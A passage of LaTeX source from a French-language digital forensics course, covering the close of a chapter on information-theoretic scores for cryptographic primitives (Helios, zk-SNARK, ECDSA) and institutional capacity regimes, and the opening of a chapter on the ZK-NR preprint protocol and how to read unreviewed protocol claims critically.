    \tableauHeader{$\mathsf{Conf}\cdot\mathsf{Rel}\cdot\mathsf{Opp}$}
}
Helios (vote) & $0{,}92$ & $0{,}95$ & $0{,}50$ & $0{,}437$ \\
zk-SNARK (conformité) & $0{,}89$ & $0{,}96$ & $0{,}67$ & $0{,}572$ \\
ECDSA (signature) & $0{,}31$ & $0{,}98$ & $0{,}90$ & $0{,}273$ \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.3. Synthèse intégrale des trois
analyses publiées dans~\cite{minka2026clo}, Table~1}\end{center}

\begin{boiteRemarque}{Ce que ce tableau ne contient pas, et pourquoi}
Remarquez que ce tableau ne comporte que \textbf{trois} primitives~:
ce sont les seules pour lesquelles un calcul complet, avec
décomposition bit par bit publiée et vérifiable, existe dans la
littérature à la date de rédaction de ce cours. AES, ChaCha20,
RSA, Kyber, Dilithium, zk-STARKs et les signatures à seuil sont des
primitives importantes (plusieurs rencontrées au Ch.~\ref{chap:quantique}
de ce cours) mais \textbf{n'ont pas fait l'objet d'un calcul CLO
publié}. Leur attribuer des scores inventés, comme le faisait une
version antérieure de ce chapitre, constituerait exactement le type
de fausse précision scientifique dénoncé au Ch.~\ref{chap:CRO}.
La Section~\ref{sec:discussion-qualitative} les aborde, mais
\textbf{uniquement qualitativement}, en signalant explicitement
l'absence de calcul publié.
\end{boiteRemarque}

% ============================================================================
\section{Régimes de Capacité Institutionnelle}
\label{sec:regimes}
% ============================================================================

\subsection{Définition des trois régimes}

Le second article~\cite{minka2026conditional} introduit une
classification opérationnelle directement utile pour la conception
de systèmes~: pour un paramètre de sécurité $\lambda$ donné,
trois régimes de capacité institutionnelle $\Delta$ sont définis
selon la borne $\Delta/\lambda$.

\begin{tableaucours}{p{2.8cm}p{2.5cm}p{2.5cm}p{3.5cm}}{%
    \tableauHeader{Régime} &
    \tableauHeader{Plage de $\Delta$ ($\lambda=128$)} &
    \tableauHeader{Borne $\Delta/\lambda$} &
    \tableauHeader{Protocoles adaptés}
}
\textbf{Faible capacité} & $<13$~bits & $<0{,}10$ &
    Privilégier la transparence (style ECDSA)~; tribunaux de
    petites créances \\
\textbf{Capacité moyenne} & $13$--$64$~bits & $0{,}10$--$0{,}50$ &
    Protocoles équilibrés (style Helios)~; agences réglementaires
    avec personnel technique \\
\textbf{Capacité élevée} & $>64$~bits & $>0{,}50$ &
    Protocoles préservant la confidentialité (style zk-SNARK)~;
    cours de sécurité nationale, cellules de renseignement
    financier \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.4. Régimes de capacité
institutionnelle (d'après~\cite{minka2026conditional}, Table~1,
pour $\lambda=128$)}\end{center}

\subsection{Capacités $\Delta$ implicites~: validation croisée}

Une contribution remarquable du second article est de
\textbf{retrouver}, à partir des produits CLO publiés dans le
premier article, la capacité institutionnelle $\Delta$ implicite
de chaque contexte, une forme de validation croisée entre les
deux publications.

\begin{tableaucours}{p{2.8cm}p{2.2cm}p{1.5cm}p{2.5cm}p{2.0cm}}{%
    \tableauHeader{Système} &
    \tableauHeader{Produit CLO} &
    \tableauHeader{$\lambda$} &
    \tableauHeader{$\Delta$ implicite} &
    \tableauHeader{Régime}
}
Helios & $0{,}437$ & $128$ & $\gtrsim 56$~bits & Moyen-Élevé \\
zk-SNARK & $0{,}572$ & $128$ & $\gtrsim 73$~bits & Élevé \\
ECDSA & $0{,}273$ & $128$ & $\gtrsim 35$~bits & Moyen \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.5. Capacités $\Delta$
implicites, retrouvées à partir des produits CLO publiés
(d'après~\cite{minka2026conditional}, Table~2)}\end{center}

\begin{boiteRemarque}{La cohérence comme argument de validité}
Ces trois valeurs de $\Delta$ implicite (35, 56, 73~bits) tombent
\textbf{toutes} dans la plage cognitivement plausible $[20,80]$~bits
dérivée indépendamment à partir des travaux de Miller sur la mémoire
de travail (Ch.~\ref{chap:CRO}, Section~4). Plus précisément, les
auteurs notent un \textbf{facteur d'amplification} de~$1{,}8$
à~$3{,}7\times$ par rapport à la capacité individuelle de
base ($\approx 20$~bits), cohérent avec les facteurs de
documentation ($1{,}5\times$), de délibération collective
($1{,}5\times$) et de formation spécialisée ($1{,}3\times$)
identifiés au chapitre précédent. \textbf{Cette convergence entre
deux articles indépendants, utilisant des méthodes de calcul
différentes (calcul direct vs.\ inversion de la borne théorique),
constitue un argument de cohérence interne pour le cadre dans son
ensemble}, exactement le type de convergence multi-sources
valorisé depuis le Ch.~\ref{chap:for-sys} de ce cours.
\end{boiteRemarque}

% ============================================================================
\section{Discussion Qualitative~: Primitives Non Encore Analysées}
\label{sec:discussion-qualitative}
% ============================================================================

Cette section aborde, \textbf{uniquement de façon qualitative} et
en s'appuyant sur les propriétés cryptographiques établies présentées
au Ch.~\ref{chap:quantique}, des primitives rencontrées ailleurs
dans ce cours mais ne disposant pas d'un calcul CLO publié.

\begin{tableaucours}{p{2.8cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Primitive} &
    \tableauHeader{Positionnement qualitatif attendu} &
    \tableauHeader{Justification (sans calcul publié)}
}
AES-256 & Probablement proche de Helios en structure
    (forte $\mathsf{Conf}$/$\mathsf{Rel}$, $\mathsf{Opp}$ limitée) &
    Sans la clé, aucune vérification institutionnelle n'est
    possible~: structurellement analogue à la confidentialité
    ElGamal d'Helios \\
CRYSTALS-Kyber & Probablement comparable au zk-SNARK
    (haute $\mathsf{Conf}$, $\mathsf{Opp}$ contrainte par la
    nouveauté) & Standard récent (FIPS~203, Ch.~\ref{chap:quantique})~:
    jurisprudence et formation des décideurs encore limitées,
    plausiblement analogue à la situation des zk-SNARKs \\
zk-STARKs & Possiblement entre Helios et zk-SNARK & Transparent
    (pas de \textit{trusted setup}, contrairement aux zk-SNARKs)~:
    pourrait offrir une $\mathsf{Rel}$ légèrement supérieure, mais
    aucune donnée publiée ne permet de quantifier cet écart \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~28.6. Positionnement qualitatif,
sans valeurs numériques inventées}\end{center}

\begin{boxalert}
\textbf{Ce tableau est une invitation à la recherche, pas un résultat}

Les positionnements du Tableau~28.6 sont des \textbf{hypothèses
qualitatives raisonnables}, pas des résultats établis. Les calculer
rigoureusement (formalisation complète, estimation triangulée de
$H(C)$, décomposition bit par bit de $I(V;\Sigma\mid C)$) constitue
précisément le type de contribution que l'Exercice~28.3 de ce
chapitre vous invite à esquisser.
\end{boxalert}

% ============================================================================
\section{Implications pour la Conception de Systèmes Forensiques}
\label{sec:implications-conception-prim}
% ============================================================================

\subsection{Quatre étapes de sélection de protocole}

D'après~\cite{minka2026conditional}, Section~VI-C~:

\begin{enumerate}
    \item \textbf{Évaluer la capacité institutionnelle}~: estimer
          $\Delta$ via évaluation cognitive, disponibilité d'experts,
          complexité procédurale (méthode du Tableau~28.1, appliquée
          à l'institution plutôt qu'au protocole).
    \item \textbf{Identifier le régime cible}~: déterminer si le
          contexte relève du régime Faible, Moyen ou Élevé
          (Tableau~28.4).
    \item \textbf{Sélectionner le protocole adapté}~: régime
          faible~$\to$ privilégier la transparence (style ECDSA)~;
          régime moyen~$\to$ protocoles équilibrés (style Helios)~;
          régime élevé~$\to$ protocoles préservant la confidentialité
          (style zk-SNARK).
    \item \textbf{Renforcer la capacité si nécessaire}~: si le
          protocole souhaité excède la capacité institutionnelle
          disponible, investir dans la formation d'experts, la
          documentation technique, les processus de délibération
          collaborative, ou les mécanismes de témoignage expert
          externe (Ch.~12~(UE~SEC4031), experts agréés
          Décret~69/DF/544).
\end{enumerate}

\subsection{Application au contexte forensique camerounais}

\begin{boxscenario}{Positionner le système judiciaire camerounais dans
les régimes de capacité}
En s'appuyant sur les estimations de $H(C)$ du Tableau~25.2 du
Ch.~\ref{chap:bench} (juridiction générale~$\approx 8$~bits,
régulateurs spécialisés~$\approx 11$~bits) et sur le paramètre de
sécurité usuel $\lambda = 128$~bits~:

\begin{itemize}
    \item Un \textbf{tribunal de première instance camerounais
          non spécialisé} se situe, par analogie avec le calcul
          Helios ($H(C)\approx 8$~bits), dans un \textbf{régime
          de capacité faible à moyenne}~: $\Delta/\lambda \approx
          8/128 \approx 0{,}06$, proche de la borne du régime
          ``Faible''. \textbf{Implication}~: privilégier les
          preuves transparentes (signatures ECDSA, eIDAS,
          Ch.~11~(UE~SEC4031)) plutôt que des protocoles
          cryptographiquement sophistiqués mais opaques.
    \item Une \textbf{cellule spécialisée de lutte contre la
          cybercriminalité} (formée, avec accès à une expertise
          forensique dédiée, Ch.~12~(UE~SEC4031)), par analogie
          avec le contexte régulateur du zk-SNARK
          ($H(C)\approx 11$~bits), se rapproche du \textbf{régime
          moyen}~: $\Delta/\lambda \approx 11/128 \approx 0{,}09$.
    \item \textbf{Recommandation directement actionnable}~: la
          stratégie de formation des magistrats évoquée au
          Ch.~\ref{chap:bench} (Recommandation~3) n'est pas
          seulement souhaitable en abstrait, elle constitue,
          au sens précis du Tableau~28.4, le levier permettant de
          \textbf{faire progresser le système judiciaire camerounais
          d'un régime de capacité faible vers un régime moyen},
          élargissant ainsi l'éventail des protocoles cryptographiques
          dont les preuves resteraient opposables devant les
          tribunaux.
\end{itemize}
\end{boxscenario}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item La méthodologie CLO procède en \textbf{quatre étapes}~:
          formalisation, estimation triangulée de $H(C)$ (trois
          méthodes convergentes), calcul des trois mesures,
          interprétation institutionnelle.

    \item \textbf{Trois calculs intégralement publiés et reproduits}~:
          Helios ($0{,}92 \times 0{,}95 \times 0{,}50 = 0{,}437$)~;
          zk-SNARK ($0{,}89 \times 0{,}96 \times 0{,}67 = 0{,}572$)~;
          ECDSA ($0{,}31 \times 0{,}98 \times 0{,}90 = 0{,}273$).
          Chaque mesure d'opposabilité est décomposée bit par bit,
          dimension par dimension.

    \item \textbf{ECDSA atteint la plus haute opposabilité} ($90\%$)
          mais le \textbf{plus faible produit global} ($0{,}273$)~:
          la transparence maximale n'est pas le meilleur compromis
          général.

    \item \textbf{Trois régimes de capacité institutionnelle}
          (Faible~$<13$~bits, Moyen~$13$--$64$, Élevé~$>64$, pour
          $\lambda=128$) guident le choix de protocole~: transparence
          en régime faible, équilibre en régime moyen, confidentialité
          en régime élevé.

    \item \textbf{Validation croisée remarquable}~: les capacités
          $\Delta$ implicites retrouvées à partir des produits CLO
          publiés (35 à~73~bits) convergent avec l'estimation
          cognitive indépendante de Miller, cohérence interne
          entre les deux articles.

    \item \textbf{Rigueur méthodologique non négociable}~: seules
          les primitives effectivement calculées dans la littérature
          publiée reçoivent des valeurs numériques dans ce chapitre.
          Les autres (AES, Kyber, Dilithium, zk-STARKs) sont
          discutées qualitativement, sans invention de scores.

    \item \textbf{Application camerounaise}~: la formation des
          magistrats (Ch.~\ref{chap:bench}) constitue, dans le
          vocabulaire précis de ce chapitre, le levier permettant
          de faire progresser le système judiciaire d'un régime
          de capacité faible vers un régime moyen.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~28.1. Reproduire un calcul publié \niveaubase}]
\begin{enumerate}[(a)]
    \item Pour le cas zk-SNARK (Section~\ref{sec:cas-zksnark}),
          vérifiez par le calcul que
          $0{,}89 \times 0{,}96 \times 0{,}67 \approx 0{,}572$.
    \item Si l'estimation de $H(C)$ pour le régulateur passait
          de~$11$ à~$16$~bits (régulateur encore plus spécialisé),
          et si $I(V;\Sigma\mid C)$ restait à~$2$~bits, quelle
          serait la nouvelle valeur de $\mathsf{Opp}$~? Le produit
          global augmenterait-il ou diminuerait-il~? Justifiez par
          le calcul.
    \item Expliquez, en une phrase, pourquoi $H(V\mid C)$ pour
          ECDSA ($20$~bits) est nettement supérieur à celui d'Helios
          ($2$~bits), en vous appuyant sur la nature des espaces de
          verdicts respectifs.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~28.2. Régimes de capacité appliqués \niveaumoyen}]
\begin{enumerate}[(a)]
    \item Pour $\lambda = 256$~bits (sécurité renforcée, pertinente
          face aux préoccupations post-quantiques du
          Ch.~\ref{chap:quantique}), recalculez les bornes
          $\Delta/\lambda$ des trois régimes du Tableau~28.4.
          Qu'observez-vous sur la difficulté relative à atteindre
          le régime ``Élevé'' à mesure que $\lambda$ augmente~?
    \item Un laboratoire forensique national nouvellement créé
          dispose d'experts formés mais d'une jurisprudence encore
          limitée. Dans quel régime le situeriez-vous~? Quel type
          de protocole recommanderiez-vous en priorité~?
    \item En vous appuyant sur le Tableau~28.5, expliquez pourquoi
          la convergence entre les capacités $\Delta$ implicites
          et l'estimation cognitive de Miller constitue un argument
          scientifique pertinent, et quelles réserves méthodologiques
          devraient néanmoins accompagner cette interprétation
          (référez-vous à l'avertissement méthodologique de ce
          chapitre).
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~28.3. Esquisser un calcul original \niveauexpert}]
Choisissez une primitive \textbf{non couverte} par les publications
analysées dans ce chapitre~: AES-256, CRYSTALS-Kyber, ou
CRYSTALS-Dilithium (toutes rencontrées au Ch.~\ref{chap:quantique}),
appliquée à un contexte forensique camerounais de votre choix
(par exemple~: chiffrement BitLocker d'un disque saisi, signature
post-quantique d'un rapport d'expertise).
\begin{enumerate}[(a)]
    \item Formalisez le protocole selon les quatre composantes
          $\mathcal{M}, \Sigma, \mathcal{C}, \mathcal{V}$
          (Étape~1 de la méthodologie, Section~\ref{sec:methodologie}).
    \item Estimez $H(C)$ pour votre contexte choisi en appliquant
          au moins deux des trois méthodes
          (Section~\ref{sec:trois-methodes}), en justifiant vos
          hypothèses aussi explicitement que les calculs publiés
          analysés dans ce chapitre.
    \item Proposez une décomposition dimension par dimension de
          $I(V;\Sigma\mid C)$, sur le modèle du Tableau~28.2
          (ECDSA), avec au moins trois dimensions justifiées.
    \item Calculez $\mathsf{Opp}$ et situez votre primitive dans
          un régime de capacité (Tableau~28.4). Comparez votre
          résultat aux trois protocoles publiés
          (Tableau~28.3), votre estimation est-elle cohérente
          avec le positionnement qualitatif suggéré au
          Tableau~28.6~?
    \item Rédigez un paragraphe de conclusion identifiant
          explicitement les limites de votre propre estimation
          (sur le modèle de l'avertissement méthodologique des
          auteurs en ouverture de ce chapitre), qu'est-ce qui
          rendrait votre calcul rigoureux au sens d'une publication
          évaluée par les pairs, et qu'est-ce qui en l'état reste
          une approximation pédagogique~?
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} Ce chapitre clôt l'exploration théorique du
Trilemme CRO entamée au Chapitre~\ref{chap:CRO}. Vous disposez
désormais des outils mathématiques (théorie de l'information), des
résultats établis (théorèmes prouvés et publiés) et de la méthode
de calcul reproductible nécessaires pour appliquer ce cadre à
n'importe quel système de preuve numérique que vous rencontrerez
dans votre pratique professionnelle, qu'il s'agisse d'un système
existant ou d'un protocole que vous serez amené à concevoir ou
évaluer.
\end{boxinfo}

% ============================================================================
% Références bibliographiques propres à ce chapitre
% (entrées supplémentaires à intégrer dans D_bibliographie.tex,
% en complément de celles du Ch.26)
% ============================================================================
% @inproceedings{groth2016zksnark,
%   author    = {Groth, Jens},
%   title     = {On the Size of Pairing-Based Non-Interactive Arguments},
%   booktitle = {Proc. Annu. Int. Conf. Theory Appl. Cryptograph. Techn.},
%   pages     = {305--326},
%   year      = {2016}
% }
     
        % ============================================================================
% Fichier  : partie6/P06_C29_protocole_ZKNR.tex
% Titre    : Le Protocole ZK-NR -- Architecture et Statut d'un Travail
%            de Recherche en Cours
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 2.0 -- Juin 2026
% ============================================================================

\chapter{Le Protocole ZK-NR. Architecture et Statut d'un Travail
de Recherche en Cours}
\label{chap:ZKNR}

\epigraph{%
    « Zero-knowledge proofs represent one of the most powerful tools in
    cryptography, verification without disclosure, truth without
    exposure. »%
}{Shafi Goldwasser}

\niveauChapitre{Recherche}{%
    Preuves à divulgation nulle de connaissance (Ch.~\ref{chap:CRO},
    \ref{chap:prim-crypt}) recommandées. Chapitre~\ref{chap:cryptanal}
    (cryptanalyse, prudence sur les travaux en cours) indispensable~:
    ce chapitre applique scrupuleusement la même discipline.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Décrire l'objectif annoncé du protocole ZK-NR
          (\textit{Zero-Knowledge Non-Repudiation}) et son architecture
          de principe, déductible des primitives nommées.
    \item Situer chacune des quatre primitives composantes
          (Merkle, STARK, signatures à seuil, signature post-quantique)
          dans le cadre théorique déjà établi (Ch.~\ref{chap:CRO}
          à~\ref{chap:quantique}).
    \item Comprendre précisément ce que signifie le \textbf{statut
          de prépublication} en recherche scientifique, et pourquoi
          il impose une lecture critique distincte de celle d'un
          article publié et évalué par les pairs.
    \item Appliquer une grille de lecture critique à une annonce de
          protocole de recherche, compétence transférable à
          toute situation où un investigateur rencontre un outil
          ou un mécanisme cryptographique émergent, non encore
          validé par la communauté scientifique.
    \item Distinguer ce qu'une description architecturale permet
          d'affirmer en toute rigueur de ce qui resterait à établir
          par une publication complète et évaluée par les pairs.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Un chapitre sur un protocole, et sur la lecture critique
d'un protocole}
% ============================================================================

Ce chapitre porte sur ZK-NR (\textit{Zero-Knowledge Non-Repudiation}),
un protocole de recherche de l'auteur de ce cours, décrit dans une
prépublication déposée sur l'IACR ePrint~\cite{minka2025zknr}, conçu
pour la non-répudiation préservant la vie privée avec des garanties
post-quantiques. Mais il porte, tout autant, sur une question plus
générale et directement utile à votre pratique
professionnelle~: \textbf{comment lire et évaluer rigoureusement
l'annonce d'un protocole cryptographique qui n'existe encore qu'en
prépublication, sans évaluation par les pairs}, une situation que vous
rencontrerez à de nombreuses reprises, face à des outils
commerciaux, des préprints académiques, ou des annonces
technologiques, tout au long de votre carrière d'investigateur.

\separateur

% ============================================================================
\section{Objectif Annoncé et Architecture de Principe}
\label{sec:objectif-architecture}
% ============================================================================

\subsection{L'objectif visé}

ZK-NR vise à répondre à un problème directement issu du Trilemme CRO
formalisé au Ch.~\ref{chap:CRO}~: produire des attestations
numériques offrant \textbf{simultanément}~:
\begin{itemize}
    \item une \textbf{non-répudiation forte}. l'émetteur d'une
          attestation ne peut nier l'avoir produite, propriété
          centrale de l'opposabilité juridique
          (Ch.~8~(UE~SEC4031), Ch.~\ref{chap:rapport})~;
    \item une \textbf{préservation de la confidentialité}.
          ne révéler que le strict nécessaire, sur le modèle des
          preuves à divulgation nulle (Ch.~\ref{chap:CRO},
          Section~4.4)~;
    \item une \textbf{résistance post-quantique}. anticiper,
          conformément au Ch.~\ref{chap:quantique}, la menace que
          représente l'algorithme de Shor pour les mécanismes
          de signature classiques.
\end{itemize}

\begin{boxCRO}
\textbf{Analyse CRO. ZK-NR comme tentative architecturale face
au Trilemme}

Le Théorème~3 (Ch.~\ref{chap:CRO}) établit qu'aucune primitive
unique ne peut maximiser simultanément $\mathsf{Conf}$,
$\mathsf{Rel}$ et $\mathsf{Opp}$. L'objectif affiché de ZK-NR
illustre précisément la \textbf{réponse architecturale} que ce
théorème appelle~: non pas chercher une primitive miracle, mais
\textbf{combiner plusieurs primitives complémentaires}, chacune
apportant sa force dominante, exactement la logique de
l'architecture Gold-Iron-Clay déjà présentée comme optimale dans
sa classe de construction (Ch.~\ref{chap:CRO}, Section~6.1).

\cro{$\sim$ objectif visé}{$\sim$ objectif visé}{$\sim$ objectif visé}

\textbf{Note de prudence}~: cette analyse porte sur la
\textbf{cohérence de l'objectif annoncé} avec le cadre théorique
établi, pas sur une évaluation de l'atteinte effective de cet
objectif par l'implémentation, question qui ne peut être
tranchée qu'à l'examen d'une publication complète.
\end{boxCRO}

\subsection{Architecture de principe~: quatre primitives, quatre rôles}

L'architecture annoncée combine quatre couches, chacune correspondant
à une primitive \textbf{individuellement réelle et bien documentée}
dans la littérature scientifique, ce qui permet d'en discuter
le rôle de principe sans dépendre d'une publication ZK-NR complète.

\begin{tableaucours}{p{2.8cm}p{3.2cm}p{5.0cm}}{%
    \tableauHeader{Couche} &
    \tableauHeader{Primitive sous-jacente} &
    \tableauHeader{Rôle de principe (déductible des propriétés
    publiques de la primitive)}
}
\textbf{Engagement} & Arbre de Merkle &
    Structure d'engagement immuable~: garantit qu'un ensemble de
    données ne peut être modifié sans que la modification soit
    détectable, principe déjà rencontré au Ch.~\ref{chap:for-sys}
    pour l'intégrité de structures de données \\
\textbf{Preuve} & STARK &
    Preuve à divulgation nulle de connaissance, \textbf{transparente}
    (sans \textit{trusted setup}), propriété qui la distingue
    structurellement des zk-SNARKs analysés au
    Ch.~\ref{chap:prim-crypt}, lesquels nécessitent une configuration
    de confiance initiale \\
\textbf{Signature} & Signature à seuil (BLS ou
    équivalent) & Permet une attestation collective nécessitant
    l'accord d'un sous-ensemble de signataires, analysée en
    détail au Ch.~\ref{chap:cas-zknr} (vulnérabilité face à Shor,
    Tableau~32.1) \\
\textbf{Authentification} & Signature post-quantique
    (Dilithium/ML-DSA ou équivalent) & Résistance à long terme face
    à la menace quantique (Ch.~\ref{chap:quantique}, FIPS~204),
    compense, en principe, la vulnérabilité de la couche précédente \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~29.1. Architecture de principe de
ZK-NR, primitive par primitive}\end{center}

\begin{boiteRemarque}{Ce que ce tableau établit, et ce qu'il
n'établit pas}
Chaque ligne du Tableau~29.1 décrit une propriété \textbf{de la
primitive elle-même}, vérifiable indépendamment dans la littérature
citée tout au long de ce cours (Merkle~: Ch.~\ref{chap:for-sys}~;
STARK~: Ch.~\ref{chap:quantique}, Ch.~\ref{chap:prim-crypt}~;
BLS~: Ch.~\ref{chap:cas-zknr}~; Dilithium~: Ch.~\ref{chap:quantique},
FIPS~204). Ce tableau \textbf{n'établit pas}, et ne peut pas
établir, en l'absence d'article complet, que leur
\textbf{combinaison spécifique} dans ZK-NR atteint effectivement
les propriétés de sécurité visées, ni quelle est la complexité
exacte de leur orchestration, ni quelles garanties formelles ont
été démontrées pour l'ensemble du système plutôt que pour chaque
composant pris isolément.
\end{boiteRemarque}

% ============================================================================
\section{Sur le Statut de Prépublication en Recherche Scientifique}
\label{sec:statut-prepublication}
% ============================================================================

\subsection{Une distinction essentielle}

\begin{boxdef}
\textbf{Prépublication}\index{prépublication}
(\textit{preprint})~: document de recherche rendu public par ses
auteurs, typiquement sur une plateforme telle qu'\textit{ePrint}
(IACR) ou \textit{arXiv}, \textbf{avant} ou \textbf{indépendamment}
d'une évaluation formelle par les pairs (\textit{peer review}) dans
le cadre d'une revue ou conférence scientifique.

\textbf{Publication évaluée par les pairs}~: document ayant subi
un processus d'évaluation indépendant par des experts du domaine,
mandatés par une revue ou conférence, vérifiant la rigueur des
démonstrations, la nouveauté de la contribution, et la validité
des conclusions, avant acceptation et publication officielle.
\end{boxdef}

\begin{boxalert}
\textbf{La distinction n'est pas une question de qualité présumée,
mais de statut de vérification}

Une prépublication n'est \textbf{pas nécessairement de moindre
qualité} qu'une publication évaluée par les pairs, de nombreux
résultats majeurs de l'histoire des mathématiques et de
l'informatique ont d'abord circulé en prépublication. La
différence est d'une autre nature~: une prépublication
\textbf{n'a pas encore été soumise au contrôle indépendant} qui
permet à un tiers de s'appuyer dessus avec la même confiance
qu'un résultat publié et vérifié. C'est exactement la distinction
qui sépare, dans ce cours, le statut du Trilemme CRO \textbf{avant}
sa publication dans IEEE Access (Ch.~\ref{chap:CRO}, où il aurait
fallu le traiter avec cette même prudence) de son statut
\textbf{après} cette publication, où les Théorèmes~1 à~3 peuvent
être cités et utilisés comme des résultats établis.
\end{boxalert}

\subsection{Application au cas ZK-NR}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Critère} &
    \tableauHeader{Trilemme CRO (Ch.~\ref{chap:CRO}-\ref{chap:prim-crypt})} &
    \tableauHeader{ZK-NR (ce chapitre)}
}
Statut de publication & Publié et évalué par les pairs (IEEE Access,
    2026) & Prépublication sur l'IACR ePrint
    (2025/1138)~\cite{minka2025zknr}~; non encore évaluée par les
    pairs ni auditée \\
Démonstrations & Théorèmes~1, 2, 3 entièrement démontrés
    et vérifiés (Pinsker, Fano) & Architecture de principe
    décrite (Tableau~29.1)~; preuves de sécurité formelle non
    accessibles pour vérification \\
Validation empirique & Trois études de cas calculées et publiées
    (Helios, zk-SNARK, ECDSA) & Aucune donnée chiffrée publiée
    et vérifiable \\
\textbf{Usage approprié dans ce cours} & Citer les théorèmes,
    reproduire les calculs, s'appuyer sur les résultats
    & Décrire l'objectif et l'architecture de principe~;
    \textbf{ne pas} affirmer de propriétés de sécurité
    spécifiques non vérifiées \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~29.2. Comparaison de statut~:
Trilemme CRO publié vs.\ ZK-NR en développement}\end{center}

% ============================================================================
\section{Grille de Lecture Critique d'une Annonce de Protocole}
\label{sec:grille-lecture}
% ============================================================================

Cette section généralise la démarche appliquée à ZK-NR en une
grille transférable, directement utile face à \textbf{tout}
protocole ou outil cryptographique émergent rencontré dans votre
pratique professionnelle, qu'il s'agisse d'une solution
commerciale présentée par un fournisseur, d'un préprint académique,
ou d'une annonce technologique relayée par la presse spécialisée.

\begin{tableaucours}{p{3.2cm}p{8.8cm}}{%
    \tableauHeader{Question} &
    \tableauHeader{Ce qu'elle permet de vérifier}
}
\textbf{Quel est le statut de
    publication exact~?} & Prépublication (ePrint, arXiv)~?
    Publication évaluée par les pairs (revue, conférence)~? Simple
    communiqué de presse ou documentation commerciale sans
    publication scientifique sous-jacente~? \\
\textbf{Les primitives composantes
    sont-elles individuellement
    documentées~?} & Chaque brique cryptographique utilisée
    a-t-elle, elle-même, fait l'objet d'une analyse de sécurité
    publiée et reconnue (sur le modèle du Tableau~29.1 pour ZK-NR)~? \\
\textbf{Les propriétés de sécurité
    globales sont-elles
    démontrées, ou seulement
    affirmées~?} & Existe-t-il une preuve formelle complète
    (Ch.~\ref{chap:form-meth}) de la combinaison, ou seulement une
    description qualitative des propriétés espérées~? \\
\textbf{Des scores numériques
    précis sont-ils avancés~?} & Si oui, une méthode de calcul
    complète est-elle publiée et reproductible (sur le modèle du
    Ch.~\ref{chap:prim-crypt})~? Un score sans méthode vérifiable
    doit être traité avec le plus grand scepticisme. \\
\textbf{Quelles limitations les
    auteurs reconnaissent-ils
    eux-mêmes~?} & Les auteurs sérieux identifient explicitement
    les limites de leur propre travail (cf.~le Trilemme CRO,
    Ch.~\ref{chap:CRO}, qui qualifie ses propres bornes de
    ``open problem'' sur certains aspects)~; l'absence totale de
    limitation reconnue est elle-même un signal d'alerte. \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~29.3. Grille de lecture critique
d'une annonce de protocole cryptographique}\end{center}

\begin{boxjuris}
\textbf{Application judiciaire de cette grille~: le témoignage
d'expert face à un protocole émergent}

Un expert judiciaire camerounais (Ch.~12~(UE~SEC4031)) appelé
à se prononcer sur la fiabilité d'un mécanisme cryptographique
récent, utilisé, par exemple, par une plateforme Mobile Money
pour sécuriser ses transactions (Ch.~\ref{chap:for-mob}), doit
appliquer cette même grille avant de fonder une conclusion sur ce
mécanisme. Affirmer la fiabilité d'un protocole sur la seule base
de la documentation commerciale du fournisseur, sans vérifier son
statut de publication et de validation indépendante
(Tableau~29.3), exposerait l'expert à une contestation directe en
contre-interrogatoire (Ch.~\ref{chap:rapport}), exactement le
type de question illustrée à l'Exercice~32.3 de ce cours
concernant le protocole fictif ``CamSeal''.
\end{boxjuris}

% ============================================================================
\section{Ce que ZK-NR Illustre pour la Pratique Forensique}
\label{sec:illustration-pratique}
% ============================================================================

Indépendamment du statut de publication de ZK-NR lui-même, son
\textbf{architecture de principe} illustre des leçons directement
applicables à la pratique forensique de ce cours.

\begin{enumerate}
    \item \textbf{La non-répudiation post-quantique est un problème
          réel et actuel}~: le Ch.~\ref{chap:quantique} a établi
          que les signatures de la chaîne de custody numérique
          d'aujourd'hui (Ch.~8~(UE~SEC4031)) pourraient perdre
          leur valeur probatoire si l'algorithme sous-jacent
          devient cassable. Tout effort de recherche visant une
          non-répudiation résistante au quantique répond à un
          besoin identifié, indépendamment de l'aboutissement
          spécifique de tel ou tel protocole.
    \item \textbf{La préservation de la vie privée et l'opposabilité
          judiciaire sont en tension structurelle}~: le Théorème~3
          (Ch.~\ref{chap:CRO}) l'a démontré mathématiquement. Tout
          protocole visant à combiner les deux doit nécessairement
          composer plusieurs primitives, aucune primitive unique
          ne peut s'y soustraire.
    \item \textbf{La recherche en cryptographie appliquée à la
          forensique est un domaine actif}~: ce cours lui-même,
          par ses six chapitres de Partie~VI, illustre que les
          questions soulevées par la pratique forensique
          camerounaise (Ch.~12~(UE~SEC4031),
          Ch.~\ref{chap:bench}) trouvent un écho direct dans la
          recherche scientifique internationale en cryptographie
          institutionnelle.
\end{enumerate}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{ZK-NR} vise une non-répudiation préservant la vie
          privée avec garanties post-quantiques, en combinant quatre
          primitives~: engagement de Merkle, preuve STARK
          (transparente), signature à seuil, signature
          post-quantique, chaque primitive étant individuellement
          réelle et documentée, indépendamment du statut du protocole
          combiné.

    \item Cette architecture illustre, par sa conception même, la
          \textbf{réponse au Trilemme CRO} (Ch.~\ref{chap:CRO})~:
          combiner plusieurs primitives complémentaires plutôt que
          chercher une primitive unique impossible.

    \item \textbf{Distinction essentielle}~: \textbf{prépublication}
          (statut non vérifié par les pairs) vs.\ \textbf{publication
